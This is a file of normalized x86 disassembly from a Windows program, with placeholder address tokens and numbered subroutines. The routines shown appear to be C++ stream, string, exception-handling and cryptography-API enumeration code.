lea eax [ eax + esi * 2 ]
mov esi [ ecx + 0x24 ]
mov [ esi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_404200
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x8 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_435d94
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_404240
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x10 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_435d94
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_404280
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4036e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_4042b0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x60 ]
mov ecx esi
call sub_403550
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_4042e0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x18 ]
mov [ edx + eax - 0x18 ] r--data
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x18 ] r--data
push eax
mov [ eax ] r--data
call sub_435d94
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_404340
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_403ba0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_4043f0
push ebp
mov ebp esp
push 0xffffffff
push sub_4524db
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov esi [ edx + 0x4 ]
add esi edi
mov ecx esi
call sub_402e90
mov eax [ ebp + 0xc ]
push 0x20
mov ecx esi
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] ebx
call sub_404a20
mov [ esi + 0x40 ] ax
cmp [ esi + 0x38 ] ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ edi + edx + 0x10 ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
or eax 0x4
or eax 0x4
push ebx
push eax
mov ecx esi
call sub_402d50
sub_4044a0
push ebp
mov ebp esp
push 0xffffffff
push sub_451aa8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
mov ecx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test cl 0x2
jne r-xdata
test cl 0x4
jne r-xdata
mov edx [ eax + 0x24 ]
cmp [ edx ] edi
je r-xdata
mov ebx 0x7
xor edx edx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x48 ] dx
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x10 ] edi
xor eax eax
mov [ esi + 0x14 ] ebx
lea edi [ ebp - 0x48 ]
mov [ esi ] ax
call sub_4023e0
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov ecx [ eax + 0x20 ]
cmp [ ecx ] edi
je r-xdata
mov edx [ edx ]
mov ecx [ eax + 0x3c ]
cmp ecx edx
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x48 ]
mov ecx [ ecx ]
mov edx [ eax + 0x30 ]
mov edx [ edx ]
lea ecx [ ecx + edx * 2 ]
mov edx [ eax + 0x10 ]
mov eax [ edx ]
sub ecx eax
sar ecx 0x1
xor edx edx
push ecx
mov ebx 0x7
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
sar ecx 0x1
xor edx edx
push ecx
mov ebx 0x7
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] dx
call sub_401c90
mov [ ebp - 0x4 ] edi
mov ecx edx
mov [ esi + 0x10 ] edi
xor eax eax
mov [ esi + 0x14 ] ebx
lea edi [ ebp - 0x2c ]
mov [ esi ] ax
call sub_4023e0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x2c ]
jmp r-xdata
push ecx
call sub_43811c
add esp 0x4
sub_4045e0
push ebp
mov ebp esp
push 0xffffffff
push sub_451a68
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call j_sub_43d14a
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_404650
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
sub_404650
push ebp
mov ebp esp
push 0xffffffff
push sub_451a40
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
test [ eax + edi + 0x14 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor esi esi
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
test esi esi
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_4046f0
push ebp
mov ebp esp
push 0xffffffff
push sub_4524ac
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov esi [ edx + 0x4 ]
add esi edi
mov ecx esi
call sub_402e90
mov eax [ ebp + 0x8 ]
push 0x20
mov ecx esi
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] ebx
call sub_404a20
mov [ esi + 0x40 ] ax
cmp [ esi + 0x38 ] ebx
jne r-xdata
mov [ edi ] r--data
mov [ edi + 0x10 ] r--data
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ esi + 0xc ]
or eax 0x4
push ebx
push eax
mov ecx esi
call sub_402d50
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push esi
call sub_435d3f
add esp 0x4
sub_4047b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4511db
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_4361c7
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_438178
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
call sub_43609f
mov [ edi ] eax
call sub_435e5e
push 0x0
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_436188
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_4361b0
jmp r-xdata
inc eax
mov [ ebx + 0x4 ] eax
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x38 ] edi
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea edx [ esi + 0x2c ]
mov [ esi + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4048a0
push ebp
mov ebp esp
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax [ ebp + 0x8 ]
push ecx
mov ecx esi
call sub_401c90
mov eax esi
pop ebp
retn 0x4
sub_4048d0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx eax
mov eax [ esi + 0x40 ]
and eax 0x6
cmp al 0x6
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
xor edi edi
test ebx ebx
je r-xdata
mov edx [ ebp + 0x8 ]
add ebx ebx
push ebx
push edx
push edi
call sub_43a8a0
add esp 0xc
test [ esi + 0x40 ] 0x4
lea eax [ ebx + edi ]
mov [ esi + 0x3c ] eax
jne r-xdata
cmp ebx 0x7fffffff
ja r-xdata
mov ecx [ esi + 0x40 ]
test cl 0x2
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov edx [ esi + 0x20 ]
mov [ edx ] edi
mov edx [ esi + 0x30 ]
mov ecx ebx
sar ecx 0x1
mov [ edx ] ecx
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_437cb3
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_43c3a5
int3
lea ecx [ ebx + ebx ]
push ecx
call sub_438178
mov edi eax
add esp 0x4
test edi edi
je r-xdata
or [ esi + 0x40 ] 0x1
pop edi
test cl 0x10
jne r-xdata
mov ecx [ esi + 0x14 ]
mov [ ecx ] edi
mov edx [ esi + 0x24 ]
sub ebx eax
mov [ edx ] eax
mov eax [ esi + 0x34 ]
add ebx edi
sar ebx 0x1
mov [ eax ] ebx
mov ecx [ esi + 0x20 ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax edi
mov edx [ esi + 0x10 ]
mov [ edx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
sar edi 0x1
mov [ ecx ] edi
sub_4049c0
lea edx [ ecx + 0x18 ]
mov [ ecx + 0x20 ] edx
lea edx [ ecx + 0x1c ]
mov [ ecx + 0x24 ] edx
lea eax [ ecx + 0x8 ]
mov [ ecx + 0x10 ] eax
lea edx [ ecx + 0x28 ]
mov [ ecx + 0x30 ] edx
lea eax [ ecx + 0xc ]
mov [ ecx + 0x14 ] eax
lea edx [ ecx + 0x2c ]
mov [ ecx + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ ecx + 0x24 ]
mov [ eax ] 0x0
mov edx [ ecx + 0x34 ]
mov [ edx ] 0x0
mov eax [ ecx + 0x10 ]
mov [ eax ] 0x0
mov edx [ ecx + 0x20 ]
mov [ edx ] 0x0
mov eax [ ecx + 0x30 ]
mov [ eax ] 0x0
retn
sub_404a20
push ebp
mov ebp esp
push 0xffffffff
push sub_451388
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_402e50
push eax
mov [ ebp - 0x4 ] 0x0
call sub_404ad0
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x10 ]
add esp 0x4
mov ebx eax
test edi edi
je r-xdata
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x28 ]
push eax
mov ecx ebx
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x14 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_404ad0
push ebp
mov ebp esp
push 0xffffffff
push sub_451358
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_436188
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_436188
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_4361b0
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_435e5e
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4361b0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_402900
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_436188
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_437d0f
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_43c3a5
lea ecx [ ebp + 0x8 ]
call sub_4361b0
push esi
call sub_435de7
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_404c10
push ebp
mov ebp esp
push 0xffffffff
push sub_452472
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x14 ] esi
lea ecx [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
mov edi eax
mov eax [ ebx ]
mov edx [ eax + 0x4 ]
mov ecx [ edx + ebx + 0x24 ]
mov eax [ edx + ebx + 0x20 ]
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x34 ] esi
test ecx ecx
jl r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
jg r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebx ]
mov eax [ ecx + 0x4 ]
cmp [ eax + ebx + 0xc ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
cmp ecx esi
jl r-xdata
test eax eax
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + ebx + 0xc ] 0x0
sete cl
mov [ ebp - 0x3c ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + ebx + 0x3c ]
test eax eax
je r-xdata
jg r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x18 ]
push edx
add ecx ebx
call sub_402e50
push eax
mov [ ebp - 0x4 ] 0x3
call sub_404ad0
mov [ ebp - 0x4 ] 0x2
mov edi [ ebp - 0x18 ]
add esp 0x4
mov [ ebp - 0x20 ] eax
test edi edi
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
mov ecx eax
call sub_403670
sub eax edi
sbb ecx esi
mov [ ebp - 0x2c ] ecx
jmp r-xdata
cmp eax edi
jbe r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push 0x0
lea ecx [ ebp - 0x1c ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov edx [ ebx ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx ebx
test edx edx
je r-xdata
mov ecx [ edx + ebx + 0x38 ]
mov edi ebx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x40 ] edi
test ecx ecx
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jl r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x1c ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov [ ebp - 0x4 ] 0x5
call j_sub_43d14a
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x4 ]
xor ecx ecx
mov [ eax + ebx + 0x20 ] ecx
mov [ eax + ebx + 0x24 ] ecx
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
test esi esi
jl r-xdata
jg r-xdata
mov esi [ ebp - 0x34 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edi [ ebp - 0x40 ]
mov esi [ ebp - 0x30 ]
jmp r-xdata
jg r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + ebx + 0x38 ]
movzx edx [ eax + ebx + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x30 ] 0x0
jbe r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
cmp [ ebp - 0x2c ] 0x0
jl r-xdata
mov edx [ ebp + 0xc ]
mov al [ edx ]
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
mov edx [ edx + 0x28 ]
mov [ ebp - 0x24 ] al
mov eax [ ebp - 0x24 ]
push eax
call edx
movzx edx ax
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + ebx + 0x38 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x38 ] 0x0
jbe r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
jg r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
or eax 0xffffffff
add [ ebp - 0x30 ] eax
adc [ ebp - 0x2c ] eax
jmp r-xdata
or [ ebp - 0x14 ] 0x4
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edi [ eax + 0x2 ]
mov [ ecx ] edi
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + ebx + 0x38 ]
movzx edx [ eax + ebx + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test esi esi
je r-xdata
add [ ebp - 0x38 ] 0xffffffff
adc esi 0xffffffff
inc [ ebp + 0xc ]
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edi [ eax + 0x2 ]
mov [ ecx ] edi
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
add esi 0xffffffff
adc [ ebp - 0x2c ] 0xffffffff
jmp r-xdata
or [ ebp - 0x14 ] 0x4
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edi [ eax + 0x2 ]
mov [ ecx ] edi
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_404ed7
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_404f80
push ebp
mov ebp esp
push 0xffffffff
push sub_4525f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x34 ]
push ecx
lea edx [ ebp - 0x3c ]
xor ebx ebx
push edx
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] ebx
call [ rw-data ]
test eax eax
sete al
mov [ ebp - 0x2d ] al
cmp al bl
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x34 ]
xor edi edi
cmp [ eax ] ebx
jbe r-xdata
push eax
call [ rw-data ]
mov al [ ebp - 0x2d ]
jmp r-xdata
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
xor ecx ecx
mov [ ebp - 0x2c ] cx
mov ecx eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea esi [ ecx + 0x2 ]
mov dx [ ecx ]
add ecx 0x2
cmp dx bx
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
lea ecx [ ebp - 0x2c ]
call sub_401c90
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x38 ]
lea ecx [ ebp - 0x2c ]
call sub_4039d0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax [ ebp - 0x34 ]
inc edi
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
cmp edi [ eax ]
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
xor ebx ebx
sub_405090
push ebp
mov ebp esp
push 0xffffffff
push sub_452ad8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
push ebx
push ebx
lea ecx [ ebp - 0x3c ]
push ecx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x34 ] ebx
call [ rw-data ]
test eax eax
jne r-xdata
mov al bl
movzx edi [ ebp + 0xc ]
mov ecx [ ebp - 0x3c ]
neg edi
sbb edi edi
and edi 0x20
push edi
lea edx [ ebp - 0x34 ]
push edx
lea eax [ ebp - 0x38 ]
push eax
push ebx
push ecx
call [ rw-data ]
cmp eax ebx
jne r-xdata
cmp eax 0x8009002a
mov eax [ ebp - 0x34 ]
sete [ ebp - 0x2d ]
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x38 ]
mov eax [ edx ]
xor ecx ecx
mov [ ebp - 0x2c ] cx
mov ecx eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea esi [ ecx + 0x2 ]
jmp r-xdata
mov edx [ ebp - 0x3c ]
push edx
call [ rw-data ]
mov al [ ebp - 0x2d ]
jmp r-xdata
push eax
call [ rw-data ]
mov dx [ ecx ]
add ecx 0x2
cmp dx bx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
sub ecx esi
sar ecx 0x1
push ecx
lea ecx [ ebp - 0x2c ]
call sub_401c90
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x40 ]
lea ecx [ ebp - 0x2c ]
call sub_4039d0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x38 ]
xor eax eax
push ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
call [ rw-data ]
mov ecx [ ebp - 0x3c ]
push edi
lea edx [ ebp - 0x34 ]
push edx
lea eax [ ebp - 0x38 ]
push eax
push 0x0
push ecx
call [ rw-data ]
xor ebx ebx
test eax eax
je r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
sub_4051e0
push ebp
mov ebp esp
sub esp 0x8
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ edx ]
push 0x4
lea ecx [ ebp - 0x8 ]
push ecx
push r--data
push eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
